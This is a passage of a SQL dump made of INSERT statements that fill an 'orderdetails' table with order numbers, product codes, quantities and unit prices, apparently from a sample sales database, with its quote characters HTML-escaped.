\u0026#39;34\u0026#39;, \u0026#39;67.14\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10316\u0026#39;, \u0026#39;S24_3420\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;55.23\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10316\u0026#39;, \u0026#39;S24_3816\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;77.15\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10316\u0026#39;, \u0026#39;S24_3949\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;67.56\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10316\u0026#39;, \u0026#39;S32_4289\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;59.16\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10316\u0026#39;, \u0026#39;S50_1341\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;36.66\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10316\u0026#39;, \u0026#39;S700_1691\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;74.90\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10316\u0026#39;, \u0026#39;S700_2047\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;73.32\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10316\u0026#39;, \u0026#39;S700_2466\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;85.76\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10316\u0026#39;, \u0026#39;S700_2610\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;67.22\u0026#39;, \u0026#39;18\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10316\u0026#39;, \u0026#39;S700_3167\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;77.60\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10316\u0026#39;, \u0026#39;S700_4002\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;68.11\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10316\u0026#39;, \u0026#39;S72_1253\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;43.70\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10317\u0026#39;, \u0026#39;S24_4278\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;69.55\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10318\u0026#39;, \u0026#39;S10_1678\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;84.22\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10318\u0026#39;, \u0026#39;S10_2016\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;102.29\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10318\u0026#39;, \u0026#39;S10_4698\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;189.79\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10318\u0026#39;, \u0026#39;S18_2581\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;81.95\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10318\u0026#39;, \u0026#39;S18_2625\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;49.67\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10318\u0026#39;, \u0026#39;S24_1578\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;93.54\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10318\u0026#39;, \u0026#39;S24_2000\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;60.94\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10318\u0026#39;, \u0026#39;S32_1374\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;81.91\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10318\u0026#39;, \u0026#39;S700_2834\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;102.04\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10319\u0026#39;, \u0026#39;S12_2823\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;134.05\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10319\u0026#39;, \u0026#39;S18_3278\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;77.19\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10319\u0026#39;, \u0026#39;S18_3782\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;54.71\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10319\u0026#39;, \u0026#39;S18_4721\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;120.53\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10319\u0026#39;, \u0026#39;S24_2360\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;65.80\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10319\u0026#39;, \u0026#39;S24_4620\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;78.41\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10319\u0026#39;, \u0026#39;S32_2206\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;35.00\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10319\u0026#39;, \u0026#39;S32_4485\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;96.95\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10319\u0026#39;, \u0026#39;S50_4713\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;79.73\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10320\u0026#39;, \u0026#39;S12_1099\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;184.84\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10320\u0026#39;, \u0026#39;S12_3380\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;102.17\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10320\u0026#39;, \u0026#39;S12_3990\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;63.84\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10320\u0026#39;, \u0026#39;S18_3482\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;139.64\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10320\u0026#39;, \u0026#39;S24_3371\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;60.62\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10321\u0026#39;, \u0026#39;S12_4675\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;105.95\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10321\u0026#39;, \u0026#39;S18_1129\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;123.14\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10321\u0026#39;, \u0026#39;S18_1589\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;120.71\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10321\u0026#39;, \u0026#39;S18_1889\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;73.92\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10321\u0026#39;, \u0026#39;S18_1984\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;142.25\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10321\u0026#39;, \u0026#39;S18_2870\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;126.72\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10321\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;164.26\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10321\u0026#39;, \u0026#39;S18_3685\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;138.45\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10321\u0026#39;, \u0026#39;S24_1046\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;68.35\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10321\u0026#39;, \u0026#39;S24_1628\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;42.76\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10321\u0026#39;, \u0026#39;S24_2766\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;74.51\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10321\u0026#39;, \u0026#39;S24_2972\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;31.72\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10321\u0026#39;, \u0026#39;S24_3191\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;81.33\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10321\u0026#39;, \u0026#39;S24_3432\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;103.87\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10321\u0026#39;, \u0026#39;S24_3856\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;137.62\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10322\u0026#39;, \u0026#39;S10_1949\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;180.01\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10322\u0026#39;, \u0026#39;S10_4962\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;141.83\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10322\u0026#39;, \u0026#39;S12_1666\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;136.67\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10322\u0026#39;, \u0026#39;S18_1097\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;101.50\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10322\u0026#39;, \u0026#39;S18_1342\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;92.47\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10322\u0026#39;, \u0026#39;S18_1367\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;44.21\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10322\u0026#39;, \u0026#39;S18_2325\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;120.77\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10322\u0026#39;, \u0026#39;S18_2432\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;57.12\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10322\u0026#39;, \u0026#39;S18_2795\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;158.63\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10322\u0026#39;, \u0026#39;S18_2949\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;100.30\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10322\u0026#39;, \u0026#39;S18_2957\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;54.34\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10322\u0026#39;, \u0026#39;S18_3136\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;90.06\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10322\u0026#39;, \u0026#39;S24_1937\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;26.55\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10322\u0026#39;, \u0026#39;S24_2022\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;40.77\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10323\u0026#39;, \u0026#39;S18_3320\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;88.30\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10323\u0026#39;, \u0026#39;S18_4600\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;96.86\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10324\u0026#39;, \u0026#39;S12_3148\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;148.06\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10324\u0026#39;, \u0026#39;S12_4473\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;100.73\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10324\u0026#39;, \u0026#39;S18_2238\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;142.45\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10324\u0026#39;, \u0026#39;S18_2319\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;105.55\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10324\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;137.17\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10324\u0026#39;, \u0026#39;S18_4027\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;120.64\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10324\u0026#39;, \u0026#39;S18_4668\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;49.81\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10324\u0026#39;, \u0026#39;S24_1444\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;49.71\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10324\u0026#39;, \u0026#39;S24_2300\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;107.34\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10324\u0026#39;, \u0026#39;S24_2840\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;29.35\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10324\u0026#39;, \u0026#39;S24_4258\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;95.44\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10324\u0026#39;, \u0026#39;S32_1268\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;91.49\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10324\u0026#39;, \u0026#39;S32_3522\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;60.76\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10324\u0026#39;, \u0026#39;S700_2824\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;80.92\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10325\u0026#39;, \u0026#39;S10_4757\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;111.52\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10325\u0026#39;, \u0026#39;S12_1108\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;193.25\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10325\u0026#39;, \u0026#39;S12_3891\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;166.10\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10325\u0026#39;, \u0026#39;S18_3140\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;114.74\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10325\u0026#39;, \u0026#39;S24_4048\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;114.73\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10325\u0026#39;, \u0026#39;S32_2509\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;44.37\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10325\u0026#39;, \u0026#39;S32_3207\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;55.30\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10325\u0026#39;, \u0026#39;S50_1392\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;99.55\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10325\u0026#39;, \u0026#39;S50_1514\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;56.24\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10326\u0026#39;, \u0026#39;S18_3259\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;94.79\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10326\u0026#39;, \u0026#39;S18_4522\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;73.73\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10326\u0026#39;, \u0026#39;S24_2011\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;120.43\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10326\u0026#39;, \u0026#39;S24_3151\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;86.74\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10326\u0026#39;, \u0026#39;S24_3816\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;81.34\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10326\u0026#39;, \u0026#39;S700_1138\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;60.67\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10327\u0026#39;, \u0026#39;S18_1662\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;154.54\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10327\u0026#39;, \u0026#39;S18_2581\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;74.34\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10327\u0026#39;, \u0026#39;S18_3029\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;74.84\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10327\u0026#39;, \u0026#39;S700_1938\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;79.68\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10327\u0026#39;, \u0026#39;S700_2610\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;65.05\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10327\u0026#39;, \u0026#39;S700_3505\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;85.14\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10327\u0026#39;, \u0026#39;S700_3962\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;83.42\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10327\u0026#39;, \u0026#39;S72_3212\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;48.05\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10328\u0026#39;, \u0026#39;S18_3856\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;104.81\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10328\u0026#39;, \u0026#39;S24_1785\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;87.54\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10328\u0026#39;, \u0026#39;S24_2841\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;67.82\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10328\u0026#39;, \u0026#39;S24_3420\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;56.55\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10328\u0026#39;, \u0026#39;S24_3949\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;55.96\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10328\u0026#39;, \u0026#39;S24_4278\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;69.55\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10328\u0026#39;, \u0026#39;S32_4289\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;57.10\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10328\u0026#39;, \u0026#39;S50_1341\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;42.33\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10328\u0026#39;, \u0026#39;S700_1691\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;84.03\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10328\u0026#39;, \u0026#39;S700_2047\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;75.13\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10328\u0026#39;, \u0026#39;S700_2466\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;95.73\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10328\u0026#39;, \u0026#39;S700_2834\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;117.46\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10328\u0026#39;, \u0026#39;S700_3167\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;71.20\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10328\u0026#39;, \u0026#39;S700_4002\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;69.59\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10329\u0026#39;, \u0026#39;S10_1678\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;80.39\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10329\u0026#39;, \u0026#39;S10_2016\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;109.42\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10329\u0026#39;, \u0026#39;S10_4698\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;164.61\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10329\u0026#39;, \u0026#39;S12_1099\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;182.90\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10329\u0026#39;, \u0026#39;S12_2823\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;128.03\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10329\u0026#39;, \u0026#39;S12_3380\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;117.44\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10329\u0026#39;, \u0026#39;S12_3990\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;74.21\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10329\u0026#39;, \u0026#39;S12_4675\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;102.49\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10329\u0026#39;, \u0026#39;S18_1889\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;66.22\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10329\u0026#39;, \u0026#39;S18_2625\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;55.72\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10329\u0026#39;, \u0026#39;S18_3278\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;65.13\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10329\u0026#39;, \u0026#39;S24_1578\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;104.81\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10329\u0026#39;, \u0026#39;S24_2000\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;71.60\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10329\u0026#39;, \u0026#39;S32_1374\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;80.91\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10329\u0026#39;, \u0026#39;S72_1253\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;41.22\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10330\u0026#39;, \u0026#39;S18_3482\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;136.70\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10330\u0026#39;, \u0026#39;S18_3782\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;59.06\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10330\u0026#39;, \u0026#39;S18_4721\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;133.92\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10330\u0026#39;, \u0026#39;S24_2360\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;56.10\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10331\u0026#39;, \u0026#39;S18_1129\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;120.31\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10331\u0026#39;, \u0026#39;S18_1589\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;99.55\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10331\u0026#39;, \u0026#39;S18_1749\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;154.70\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10331\u0026#39;, \u0026#39;S18_1984\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;135.14\u0026#39;, \u0026#39;8\u0026#39;); 